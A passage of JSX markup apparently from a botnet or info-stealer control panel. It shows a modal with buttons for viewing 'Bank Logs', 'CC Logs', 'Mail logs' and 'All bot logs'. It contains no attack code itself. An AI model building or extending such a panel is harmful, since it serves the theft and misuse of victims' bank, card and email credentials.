                ...
                <div class="modal-dialog modal-dialog-centered" role="document">
                    ...
                    <table class="buttonwidthtable">
                        <tbody>
                            <tr>
                                <td>
                                    <a class={"btn " + (_statBanks == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openBankLogsModal('Bank')}>Bank Logs</a>
                                </td>
                                <td>
                                    <a class={"btn " + (_statCards == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openBankLogsModal('CC')}>CC Logs</a>
                                </td>
                                <td>
                                    <a class={"btn " + (_statMails == 1 ? "btn-outline-success" : "btn-outline-secondary")} onClick={() => this.openBankLogsModal('Mails')}>Mail logs</a>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <h4 style={({textAlign:'center', marginTop:'25px'})}>All bot logs</h4>
                    <table class="buttonwidthtable">
                        <tbody>
                            <tr>
                                <td>
